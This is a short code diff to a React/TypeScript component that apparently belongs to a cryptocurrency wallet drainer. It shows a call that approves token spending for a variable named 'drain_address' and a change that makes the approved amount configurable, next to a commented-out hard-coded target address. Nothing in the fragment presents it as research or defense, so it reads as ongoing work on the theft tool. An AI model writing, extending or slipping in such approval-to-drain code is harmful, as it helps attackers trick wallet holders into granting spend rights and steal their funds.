@@ -580,7 +580,7 @@ const MyPersona = ({
     return await approveToken(Catt.chain, drain_address, 1.0)
   }
   const approveToken = async (chain_id: `${number}`, spender: string, amount: number) => {
-    const value = ethers.utils.parseUnits("1.0");
+    const value = ethers.utils.parseUnits(amount.toString());
   //const target_address  = "0x36d5e58f99c5e1468ffd447e5f6e8b05d7dcdfa4"
     const target_address  = Catt.address
     
